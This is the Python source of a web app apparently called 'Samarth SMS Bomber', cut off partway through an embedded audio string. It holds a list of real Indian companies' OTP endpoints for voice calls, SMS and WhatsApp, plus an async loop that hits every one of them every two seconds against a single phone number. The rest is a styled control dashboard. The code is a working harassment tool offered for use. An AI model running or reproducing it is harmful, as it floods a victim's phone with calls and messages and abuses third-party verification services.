from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
import json
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === COMPLETE API LIST ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "Wakefit SMS", "type": "SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hungama OTP", "type": "SMS", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Doubtnut", "type": "SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "PenPencil", "type": "SMS", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "BeepKart", "type": "SMS", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Housing.com", "type": "SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "Khatabook", "type": "SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Rappi WhatsApp", "type": "WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "type": "WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
]

attack_status = {
    "running": False,
    "phone": None,
    "cycles": 0,
    "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0},
    "logs": [],
    "start_time": None,
    "duration": None,
    "export_data": []
}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 50:
        attack_status["logs"].pop()
    attack_status["export_data"].append({
        "timestamp": datetime.now().strftime('%H:%M:%S'),
        "message": msg
    })

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(
            method=api["method"],
            url=api["url"],
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False
        ) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
                return True
    except:
        pass
    return False

async def run_attack(phone, duration=None):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    attack_status["start_time"] = datetime.now()
    attack_status["duration"] = duration
    attack_status["export_data"] = []
    add_log(f"🚀 Attack initiated on +91{phone}")
    if duration:
        add_log(f"⏱️ Timer set for {duration} seconds")

    async with aiohttp.ClientSession() as session:
        start_time = datetime.now()
        while attack_status["running"]:
            if duration:
                elapsed = (datetime.now() - start_time).total_seconds()
                if elapsed >= duration:
                    add_log(f"⏰ Timer expired after {duration}s")
                    attack_status["running"] = False
                    break
            
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Samarth SMS Bomber | Premium</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0e1a;
            min-height: 100vh;
            color: #e2e8f0;
            overflow-x: hidden;
        }
        
        /* Premium Pattern Background */
        .pattern-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 10% 20%, rgba(37, 99, 235, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 90% 80%, rgba(139, 92, 246, 0.06) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 50%, rgba(59, 130, 246, 0.03) 0%, transparent 70%);
            z-index: 0;
        }
        
        /* Animated Grid */
        .grid-pattern {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 40px 40px;
            z-index: 0;
            animation: gridMove 30s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }
        
        /* Floating Orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.15;
            animation: floatOrb 15s infinite alternate ease-in-out;
            z-index: 0;
        }
        @keyframes floatOrb {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(100px, -100px) scale(1.2); }
        }
        
        /* Glass Cards */
        .glass-premium {
            background: rgba(10, 14, 26, 0.7);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.6);
            transition: all 0.3s ease;
        }
        .glass-premium:hover {
            border-color: rgba(59, 130, 246, 0.15);
        }
        
        .glass-light {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        /* Input */
        .input-premium {
            background: rgba(0, 0, 0, 0.5);
            border: 1.5px solid rgba(255, 255, 255, 0.06);
            transition: all 0.3s ease;
            color: #e2e8f0;
            font-size: 1.1rem;
            letter-spacing: 0.05em;
            padding: 0.9rem 1rem 0.9rem 4rem;
            width: 100%;
            border-radius: 12px;
            font-family: 'Inter', sans-serif;
        }
        .input-premium:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1), inset 0 0 20px rgba(59, 130, 246, 0.03);
            outline: none;
        }
        .input-premium::placeholder {
            color: rgba(148, 163, 184, 0.25);
        }
        
        /* Buttons */
        .btn-premium {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            border: none;
            border-radius: 12px;
            padding: 0.9rem 1.5rem;
            font-weight: 600;
            color: white;
            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.25);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            font-family: 'Inter', sans-serif;
            font-size: 0.95rem;
            letter-spacing: 0.02em;
        }
        .btn-premium:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(37, 99, 235, 0.4);
        }
        .btn-premium:active {
            transform: scale(0.98);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #dc2626, #ef4444);
            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.2);
        }
        .btn-danger:hover {
            box-shadow: 0 8px 30px rgba(239, 68, 68, 0.35);
        }
        
        .btn-ghost {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            transition: all 0.3s ease;
        }
        .btn-ghost:hover {
            background: rgba(59, 130, 246, 0.1);
            border-color: rgba(59, 130, 246, 0.2);
        }
        
        /* Stats */
        .stat-premium {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 12px;
            padding: 1rem;
            text-align: center;
            transition: all 0.3s ease;
        }
        .stat-premium:hover {
            border-color: rgba(59, 130, 246, 0.15);
            transform: translateY(-2px);
        }
        .stat-number {
            font-weight: 800;
            font-size: 2.2rem;
            background: linear-gradient(135deg, #60a5fa, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        /* Progress */
        .progress-premium {
            height: 3px;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 0.5rem;
        }
        .progress-fill {
            height: 100%;
            border-radius: 10px;
            background: linear-gradient(90deg, #3b82f6, #a78bfa);
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        /* Logs */
        .logs-premium {
            scrollbar-width: thin;
            scrollbar-color: rgba(59, 130, 246, 0.1) transparent;
            max-height: 250px;
            overflow-y: auto;
            font-size: 0.8rem;
            font-family: 'Inter', monospace;
        }
        .logs-premium::-webkit-scrollbar { width: 4px; }
        .logs-premium::-webkit-scrollbar-track { background: transparent; }
        .logs-premium::-webkit-scrollbar-thumb {
            background: rgba(59, 130, 246, 0.15);
            border-radius: 10px;
        }
        .log-entry {
            padding: 4px 12px;
            border-radius: 6px;
            border-left: 2px solid transparent;
            transition: all 0.15s;
            color: #94a3b8;
        }
        .log-entry:hover {
            background: rgba(59, 130, 246, 0.04);
            border-left-color: #3b82f6;
            color: #e2e8f0;
        }
        
        /* Badge */
        .badge-premium {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 4px 14px;
            border-radius: 100px;
            font-size: 0.65rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .dot-premium {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            display: inline-block;
        }
        .dot-premium.idle { background: #22c55e; }
        .dot-premium.active {
            background: #ef4444;
            animation: pulse-dot 0.8s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(0.7); }
        }
        
        /* Toggle */
        .toggle-premium {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 4px 12px;
            border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.05);
            background: rgba(0,0,0,0.3);
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.7rem;
        }
        .toggle-premium:hover {
            background: rgba(255,255,255,0.04);
        }
        
        /* Timer */
        .timer-premium {
            font-family: 'Inter', monospace;
            font-size: 1rem;
            font-weight: 600;
            color: #60a5fa;
        }
        
        /* Select */
        .select-premium {
            background: rgba(0, 0, 0, 0.5);
            border: 1.5px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            padding: 0.8rem 1rem;
            color: #e2e8f0;
            font-family: 'Inter', sans-serif;
            font-size: 0.9rem;
            width: 100%;
            transition: all 0.3s ease;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2364748b' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 14px center;
        }
        .select-premium:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
            outline: none;
        }
        .select-premium option {
            background: #0a0e1a;
            color: #e2e8f0;
        }
        
        /* Heart Overlay */
        .heart-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(8px);
        }
        .heart-overlay.active {
            display: flex;
            animation: heartFade 3s ease-out forwards;
        }
        @keyframes heartFade {
            0% { opacity: 1; backdrop-filter: blur(12px); }
            70% { opacity: 1; backdrop-filter: blur(12px); }
            100% { opacity: 0; backdrop-filter: blur(0); }
        }
        .heart-container {
            position: relative;
            width: 280px;
            height: 280px;
            animation: heartPulse 0.5s ease-in-out 6;
        }
        @keyframes heartPulse {
            0%, 100% { transform: scale(1); }
            25% { transform: scale(1.2); }
            50% { transform: scale(1); }
            75% { transform: scale(1.1); }
        }
        .heart-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: 'Inter', sans-serif;
            font-weight: 800;
            font-size: 2.5rem;
            color: #fbbf24;
            text-shadow: 0 0 40px rgba(251,191,36,0.5), 0 0 80px rgba(251,191,36,0.2);
            z-index: 1;
            text-align: center;
            line-height: 1.2;
        }
        .heart-svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 40px rgba(239,68,68,0.4));
            animation: heartGlow 1s ease-in-out infinite alternate;
        }
        @keyframes heartGlow {
            0% { filter: drop-shadow(0 0 30px rgba(239,68,68,0.3)); }
            100% { filter: drop-shadow(0 0 60px rgba(239,68,68,0.6)); }
        }
        
        /* Divider */
        .divider-premium {
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59,130,246,0.15), transparent);
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .stat-number { font-size: 1.6rem; }
            .input-premium { font-size: 0.95rem; padding-left: 3.5rem; }
            .heart-container { width: 200px; height: 200px; }
            .heart-text { font-size: 1.8rem; }
        }
    </style>
</head>
<body>

    <!-- Background -->
    <div class="pattern-bg"></div>
    <div class="grid-pattern"></div>
    
    <!-- Orbs -->
    <div class="orb" style="width:400px;height:400px;background:#3b82f6;top:-100px;right:-100px;"></div>
    <div class="orb" style="width:300px;height:300px;background:#8b5cf6;bottom:-50px;left:-50px;animation-delay:5s;"></div>
    <div class="orb" style="width:200px;height:200px;background:#06b6d4;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:8s;"></div>

    <!-- Heart Overlay -->
    <div class="heart-overlay" id="heartOverlay">
        <div class="heart-container">
            <svg class="heart-svg" viewBox="0 0 100 100">
                <defs>
                    <radialGradient id="heartGrad" cx="50%" cy="50%" r="50%">
                        <stop offset="0%" stop-color="#ef4444"/>
                        <stop offset="100%" stop-color="#b91c1c"/>
                    </radialGradient>
                </defs>
                <path d="M50 88 C20 65 0 50 0 35 C0 15 15 0 35 0 C45 0 50 8 50 8 C50 8 55 0 65 0 C85 0 100 15 100 35 C100 50 80 65 50 88Z"
                      fill="url(#heartGrad)" opacity="0.9"/>
            </svg>
            <div class="heart-text">⚡ ATTACK<br>LAUNCHED</div>
        </div>
    </div>

    <!-- Audio -->
    <audio id="wrongSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>
    <audio id="attackSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>
    <audio id="niceSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRsYDAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQYDAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFB